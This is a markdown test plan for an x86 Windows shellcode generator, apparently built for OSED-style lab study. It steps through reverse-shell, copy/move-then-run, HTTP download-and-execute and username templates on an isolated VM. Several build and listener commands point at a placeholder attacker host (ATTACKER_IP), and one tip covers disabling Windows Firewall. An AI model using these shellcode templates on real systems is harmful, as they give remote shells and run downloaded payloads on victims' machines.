# x86 Shellcode Test Plan

Test matrix for the x86 IR workflow templates. All builds happen on
the dev machine (Mac), then the `debug_runner.py` is transferred to
the Windows lab VM for execution.

---

## Prerequisites

### Dev machine (Mac)

```
cd /path/to/emitera
uv run pytest -q              # record the result with the validation evidence
```

### Windows lab VM

- WinDbg or x64dbg installed
- Python 3.x with ctypes (for debug_runner.py)
- A documented, narrowly scoped lab policy for any security-control exclusions
- Firewall rules limited to the isolated lab flows being tested
- Network connectivity to the dev machine (for revshell + HTTP)
- An SMB share or local staging directory (for copy/move tests)
- Notepad, calc, or another harmless .exe to use as a test payload

### Test payload

Create a small test .exe (or use an existing one like `whoami.exe`):

```
# On Windows, create a simple test file
echo "test payload" > C:\OSED\test_payload.txt
copy C:\Windows\System32\whoami.exe C:\OSED\test_payload.exe
```

For the copy/move/HTTP tests that need to run the payload afterward,
`whoami.exe` or `calc.exe` makes a safe, observable choice.

---

## Phase 1: Reverse shell

Tests the full pipeline: PEB walk, hash resolution, ws2_32 loading,
WSAStartup, WSASocketA, connect, CreateProcessA, and ExitProcess.
This is the most complex template and validates the entire framework.

### Build

```bash
uv run emitrion emitrion/manifests/win-x86/revshell.yaml \
    --lhost <ATTACKER_IP> --lport 9001 \
    --no-assemble --out emitter_out/revshell
```

### Test

1. On the attacker machine, start a listener:

   ```
   nc -lnvp 9001
   ```

2. Transfer `emitter_out/revshell/asm/debug_runner.py` to the Windows VM.

3. On the Windows VM:

   ```
   python debug_runner.py
   ```

4. The listener should receive a cmd.exe shell.

### Verify

- [ ] Listener receives connection
- [ ] `whoami` returns the expected user in the shell
- [ ] `exit` in the shell causes the process to terminate cleanly (ExitProcess)
- [ ] No null bytes in the output assembly (`grep "\\\\x00" emitter_out/revshell/asm/generated.asm` should be clean; check contract.md badchar report)

---

## Phase 2: CopyFileA + run

Tests CopyFileA and WinExec in sequence. The `ir_copy_then_run`
template copies a file and then executes the destination.

### Build

```bash
uv run emitrion emitrion/manifests/win-x86/ir_copy_then_run.yaml \
    --src "C:\\OSED\\test_payload.exe" \
    --dst "C:\\Windows\\Temp\\copied_payload.exe" \
    --no-assemble --out emitter_out/copy_then_run
```

### Test

1. Place `test_payload.exe` at `C:\OSED\test_payload.exe` on the Windows VM.

2. Transfer `debug_runner.py` and run it.

3. Observe:
   - The file appears at `C:\Windows\Temp\copied_payload.exe`
   - The copied file executes (if calc.exe, a calculator window opens)
   - The shellcode process exits cleanly

### Verify

- [ ] Destination file exists and matches the source (compare sizes or hashes)
- [ ] Source file is still present (copy, not move)
- [ ] Destination file was executed
- [ ] Process exits (ExitProcess)

---

## Phase 3: MoveFileA + run

Tests MoveFileA and WinExec. The `ir_move_then_run` template moves
a file and then executes it from the destination path.

### Build

For a local move (simpler to test than UNC):

```bash
uv run emitrion emitrion/manifests/win-x86/ir_move_then_run.yaml \
    --src "C:\\OSED\\test_payload.exe" \
    --dst "C:\\Windows\\Temp\\moved_payload.exe" \
    --no-assemble --out emitter_out/move_then_run
```

For a UNC path (SMB share on the attacker):

```bash
uv run emitrion emitrion/manifests/win-x86/ir_move_then_run.yaml \
    --src "\\\\<ATTACKER_IP>\\share\\test_payload.exe" \
    --dst "C:\\Windows\\Temp\\moved_payload.exe" \
    --no-assemble --out emitter_out/move_then_run_smb
```

### Test

1. Place (or re-place) `test_payload.exe` at the source path.

2. Transfer `debug_runner.py` and run it.

3. Observe:
   - The file appears at the destination
   - The source file is gone (it was moved)
   - The destination file executes

### Verify

- [ ] Destination file exists
- [ ] Source file no longer exists (moved, not copied)
- [ ] Destination file was executed
- [ ] Process exits cleanly
- [ ] (SMB variant) UNC path resolution worked

---

## Phase 4: HTTP download + run

Tests the WinInet pipeline: InternetOpenA, InternetOpenUrlA,
VirtualAlloc, InternetReadFile, CreateFileA, WriteFile, CloseHandle,
and WinExec.

### Build

```bash
uv run emitrion emitrion/manifests/win-x86/http_download.yaml \
    --url "http://<ATTACKER_IP>/test_payload.exe" \
    --dst "C:\\Windows\\Temp\\http_payload.exe" \
    --no-assemble --out emitter_out/http_download
```

### Test

1. On the attacker machine, serve the payload:

   ```
   cd /path/to/payloads
   cp /usr/bin/whoami test_payload.exe   # or any harmless .exe
   python3 -m http.server 80 --directory .
   ```

   (Or use the project's stage server for binary payloads:
   `uv run python emitrion/tcp_stage_server.py --port 80 --file test_payload.exe`)

   Note: Use the Python HTTP server, not the TCP stage server. The
   `ir_http_download` template uses WinInet (HTTP), not raw TCP.

2. Transfer `debug_runner.py` and run it on the Windows VM.

3. Observe:
   - HTTP request hits the server (visible in server logs)
   - File appears at `C:\Windows\Temp\http_payload.exe`
   - The downloaded file executes

### Verify

- [ ] HTTP server received the request
- [ ] Downloaded file exists and matches source size
- [ ] Downloaded file was executed
- [ ] wininet.dll was loaded (visible in WinDbg module list if debugging)
- [ ] Process exits cleanly

---

## Phase 5: GetUserNameA + command

Tests advapi32.dll loading via LoadLibraryA, GetUserNameA into a
128-byte stack buffer, then WinExec of a configurable command.

### Build

```bash
uv run emitrion emitrion/manifests/win-x86/get_username.yaml \
    --command "calc.exe" \
    --no-assemble --out emitter_out/get_username
```

### Test

1. Transfer `debug_runner.py` and run it on the Windows VM.

2. Observe:
   - advapi32.dll is loaded
   - The command (calc.exe) executes
   - Process exits cleanly

3. For deeper validation, attach WinDbg before execution:
   - Set a breakpoint after the GetUserNameA call
   - Inspect the 128-byte stack buffer to confirm it contains the
     current username string

### Verify

- [ ] advapi32.dll loaded (check WinDbg modules or Process Monitor)
- [ ] Command executed (calc window appears)
- [ ] (WinDbg) Username buffer contains the correct value
- [ ] Process exits cleanly

---

## Phase 6: TerminateProcess exit strategy

Tests the `terminate_process` exit strategy, which uses
`TerminateProcess(GetCurrentProcess(), exit_code)` instead of
`ExitProcess(exit_code)`. This is important for shellcode injected
into processes where ExitProcess would kill the host.

### Build

```bash
uv run emitrion emitrion/manifests/win-x86/calc.yaml \
    --template ir_run_command \
    --command "calc.exe" \
    --exit-strategy terminate_process \
    --no-assemble --out emitter_out/terminate_test
```

### Test

1. Transfer `debug_runner.py` and run it.

2. Observe:
   - calc.exe launches
   - The process terminates

3. In WinDbg, verify:
   - `TerminateProcess` is resolved and called (not ExitProcess)
   - The pseudo-handle 0xFFFFFFFF (-1) is passed as the first argument

### Verify

- [ ] Assembly contains `TerminateProcess`, not `ExitProcess`
- [ ] TerminateProcess is in the API resolution stubs (check contract.md)
- [ ] The pseudo-handle argument (0xFFFFFFFF) is encoded correctly
- [ ] Process terminates after executing the command

### Also test with other templates

Re-run any of the above templates with `terminate_process` to confirm
the exit strategy is template-independent. Good candidates:

- `ir_copy_then_run` with terminate_process
- `ir_http_download` with terminate_process

---

## Test order summary

| Phase | Template            | Key APIs tested                              | Depends on |
|-------|---------------------|----------------------------------------------|------------|
| 1     | ir_reverse_shell    | WSA*, connect, CreateProcessA, ExitProcess   | Network    |
| 2     | ir_copy_then_run    | CopyFileA, WinExec, ExitProcess              | File on VM |
| 3     | ir_move_then_run    | MoveFileA, WinExec, ExitProcess              | File on VM |
| 4     | ir_http_download    | InternetOpen/Read/Close, VirtualAlloc, CreateFileA, WriteFile, WinExec | HTTP server |
| 5     | ir_get_username     | LoadLibraryA (advapi32), GetUserNameA, WinExec | None       |
| 6     | terminate_process   | TerminateProcess with pseudo-handle          | Phase 1-5  |

The order is deliberate:

1. **Reverse shell first** validates the entire framework (PEB walk,
   hash resolver, module loading, stack layout). If this works,
   the infrastructure is sound.
2. **Copy then run** is the simplest file operation and confirms
   CopyFileA + WinExec work.
3. **Move then run** is identical in structure but uses MoveFileA,
   confirming the move semantics (source removed).
4. **HTTP download** is the most complex file operation (WinInet chain
   with VirtualAlloc, read loop, file write). Test this after simpler
   file ops are confirmed.
5. **GetUserNameA** tests a different DLL (advapi32) loaded at runtime
   and a struct-backed stack buffer, exercising a different code path
   than the kernel32-only templates.
6. **TerminateProcess** last because it changes only the exit path,
   not the payload logic. By this point every template's core logic
   is validated.

---

## Debugging tips

- **WinDbg breakpoint:** `debug_runner.py` prints the shellcode base
  address. Set `bp <addr>` before resuming to step through.
- **Process Monitor:** Filter on the debug_runner.py process to see
  file and registry activity (DLL loads, file creates, network connects).
- **Check contract.md:** Each build writes
  `emitter_out/<name>/Documentation/contract.md` with the full stack
  map, API table, struct layouts, and operational cheatsheet.
- **Badchar check:** The contract includes a badchar analysis section.
  If assembly violates badchars, add `--encode` to apply XOR wrapping.
- **Firewall:** Windows Firewall can silently block revshell and HTTP.
  Disable it or add exceptions before testing.
